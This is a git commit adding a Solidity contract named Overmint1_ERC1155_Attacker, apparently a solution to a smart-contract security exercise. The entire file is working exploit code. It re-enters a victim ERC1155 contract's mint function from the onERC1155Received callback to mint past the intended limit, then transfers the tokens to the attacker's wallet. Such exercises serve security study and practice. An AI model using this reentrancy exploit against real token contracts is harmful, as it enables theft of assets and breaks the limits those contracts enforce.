103f48b796fa5c53919e2ec28afc6ddbb6504e2b
hgrano <huw.grano@gmail.com>
2024-01-07 11:35:27 +1100

    adding ERC1155 attacker

---
+++ contracts/Overmint1-ERC1155-Attacker.sol
@@ -0,0 +1,49 @@
+// SPDX-License-Identifier: GPL-3.0
+pragma solidity 0.8.15;
+import "@openzeppelin/contracts/utils/Address.sol";
+import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
+import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
+
+import "./Overmint1-ERC1155.sol";
+
+contract Overmint1_ERC1155_Attacker is IERC1155Receiver {
+    Overmint1_ERC1155 victim;
+    address attackerWallet;
+
+    constructor(Overmint1_ERC1155 victim_) {
+        victim = victim_;
+        attackerWallet = msg.sender;
+    }
+
+    function attack() external {
+        victim.mint(0, "");
+        victim.safeTransferFrom(address(this), attackerWallet, 0, 5, "");
+    }
+
+    function onERC1155Received(
+        address operator,
+        address from,
+        uint256 id,
+        uint256 value,
+        bytes calldata data
+    ) external returns (bytes4) {
+        if (victim.totalSupply(id) < 5) {
+            victim.mint(id, data);
+        }
+        return IERC1155Receiver.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address operator,
+        address from,
+        uint256[] calldata ids,
+        uint256[] calldata values,
+        bytes calldata data
+    ) external returns (bytes4) {
+        return IERC1155Receiver.onERC1155BatchReceived.selector;
+    }
+
+    function supportsInterface(bytes4 interfaceId) external view returns (bool) {
+        return true;
+    }
+}
